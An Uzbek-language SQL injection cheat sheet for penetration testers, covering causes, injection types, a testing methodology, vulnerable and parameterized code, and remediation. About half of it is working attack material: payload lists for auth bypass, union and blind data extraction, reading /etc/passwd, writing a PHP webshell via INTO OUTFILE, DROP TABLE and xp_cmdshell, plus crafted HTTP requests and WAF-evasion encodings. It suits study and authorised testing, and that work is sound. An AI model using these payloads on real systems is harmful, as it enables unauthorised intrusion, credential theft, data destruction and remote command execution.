# SQL Injection

## 1. Ta'rif
SQL Injection (SQLi) — foydalanuvchi kiritgan ma'lumot SQL query'ga sanitizatsiyasiz qo'shilganda, attacker DB SQL so'rovini o'zgartirishi mumkin. Impact: butun DB'ni o'qish/yozish, auth bypass, RCE (xar --> O.S. command).

## 2. Qayerdan kelib chiqadi (root cause)
- String concatenation bilan query qurish (PHP `.`, Java `+`, Python `%s`)
- `$_GET`/`$_POST`/headers/cookie/User-Agent/parametrga to'g'ridan-to'g'ri ishonish
- ORM ishlatishda ham raw query yoki fltoqlangan filtrlash
- Stored procedure ichida dinamik SQL
- Order by / group by / LIMIT qiymatlari input sifatida
- JSON (PostgreSQL `->>`), XML field'iga query qo'shish

## 3. Turlari
| Tur | Xususiyati |
|-----|-----------|
| In-band (Union-based) | Ma'lumot response'da ko'rinadi |
| Error-based | DB error orqali ma'lumot chiqadi |
| Boolean-based blind | True/False farqi |
| Time-based blind | `SLEEP()` orqali |
| Out-of-band | `LOAD_FILE`, DNS/HTTP ext. |

## 4. Metodologiya (step-by-step)
1. Input'ni aniqlash — parametr list (id, username, search, order, cat, filter...).
2. Asosiy sinov: `'`, `"`, `` ` ``, `)`, `--`, `#`, `/*`
   - Error chiqsa / o'zgarish bo'lsa → SQLi shubhasi.
3. Turini aniqlash:
   - `' AND 1=1-- -` (true) vs `' AND 1=2-- -` (false) → boolean blind
   - `' OR SLEEP(5)-- -` (vaqtni kuzat) → time-based
   - `' UNION SELECT 1,2,3-- -` → union
4. Column sonini topish: `ORDER BY 1...N` yoki `NULL, NULL, NULL`.
5. DB turini aniqlash: `@@version` (MySQL), `version()` (PG), `sqlite_version()`, `@@VERSION` (MSSQL).
6. Ma'lumot qazish: schema → table → column → data.
7. Filo/file: `LOAD_FILE()`, `INTO OUTFILE` → RCE / LFI, `INTO OUTFILE` webshell.
8. Auth bypass: `admin'-- -`, `' OR 1=1-- -` login formada.
9. WAF bo'lsa: encoding, `/**/`, case, `%00`, `CONCAT`, chunked transfer.

## 5. Payload'lar
```
# Detection
' OR 1=1-- -
' OR 1=1#
' OR '1'='1
admin'--
1' AND '1'='1
1') OR ('1'='1
1" OR 1=1-- -

# Union
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT username,password FROM users-- -
1' ORDER BY 5-- -
1' UNION SELECT 1,2,3,4,5-- -
' UNION SELECT @@version,2,3-- -

# Error-based (MySQL)
' AND extractvalue(1, concat(0x7e, (SELECT version())))-- -
' AND updatexml(1, concat(0x7e, (SELECT version())), 1)-- -
1 AND (SELECT 1 FROM (SELECT count(*), concat(version(), floor(rand(0)*2)) x FROM information_schema.tables group by x) y)-- -

# Boolean blind
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -
' AND (SELECT ASCII(SUBSTR(database(),1,1)))=115-- -

# Time-based
' AND SLEEP(5)-- -
'; WAITFOR DELAY '0:0:5'-- -       # MSSQL
' AND pg_sleep(5)-- -               # PostgreSQL
' || pg_sleep(5)-- -                # PG no-comment birikma

# Out-of-band
' LOAD_FILE('/etc/passwd')
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
SELECT ... INTO OUTFILE '/var/www/shell.php'

# Comment
-- -   (space kerak)
--+
#
%;00
/*!50000SELECT*/ (MySQL conditional comment)

# Stacked queries
'; DROP TABLE users;--
'; EXEC xp_cmdshell('id')-- -       # MSSQL
; SELECT pg_sleep(5);
```

## 6. Request misollari
```
GET /product.php?id=1' HTTP/1.1
Host: target.com

# Union qazish
GET /product.php?id=1' UNION SELECT username,password,email FROM users-- -
GET /product.php?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -

# POST login bypass
POST /login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin'-- -&password=x

# JSON w/ PostgreSQL
POST /api/user HTTP/1.1
Content-Type: application/json

{"name": "' OR 1=1-- -"}
```

## 7. Zaif code misollari
```php
// PHP — ZAIF
$id = $_GET['id'];
$sql = "SELECT * FROM products WHERE id = $id";        // UNION mumkin
$sql = "SELECT * FROM users WHERE user='$u' AND pass='$p'"; // ' OR 1=1

// Java — ZAIF
String q = "SELECT * FROM users WHERE id = " + id;
Statement s = conn.createStatement();
s.executeQuery(q);

// Python — ZAIF
cur.execute("SELECT * FROM products WHERE id = %s" % id)

// Python — XAVFSIZ
cur.execute("SELECT * FROM products WHERE id = %s", (id,))

// PHP — XAVFSIZ
$stmt = $pdo->prepare("SELECT * FROM products WHERE id = ?");
$stmt->execute([$id]);
```

## 8. Nimalarga ahamiyat berish kerak (checklist)
- [ ] Error'dan tool/routing/freymwork nomi chiqyaptimi (information leak)
- [ ] Union'da `NO_DATA` in json/plain — col soni va turiga qarang
- [ ] Filter bor bo'lsa: `UNION` bloklangan → `UnIoN`, `/**/`, `%75%6e%69%6f%6e`, `concat` yordamida
- [ ] Double encoding `%2527`
- [ ] Mobile API — sanitizatsiya frontend'da bo'lib server'da emas
- [ ] Second-order SQLi — ma'lumot saqlanib keyin xom holatda ishlatilsa (username DB'da saqlanadi, keyin query'ga)
- [ ] JSON/XML field → nosql/xxe bilan aralash
- [ ] Time-based — parametrni `X-Forwarded-For`, `User-Agent`, cookie da ham sinang
- [ ] Intruder'da `SLEEP(5)` va `SLEEP(0)` — vaqt farqini stat bilan

## 9. Himoya (remediation)
- Prepared statements / parameterized queries (majburiy)
- Input validation (whitelist), esacape on output, least-privilege DB user
- WAF (no reliance), query`ni log qilish
- Never run as root / sa superuser (PostgreSQL), xp_cmdshell disabled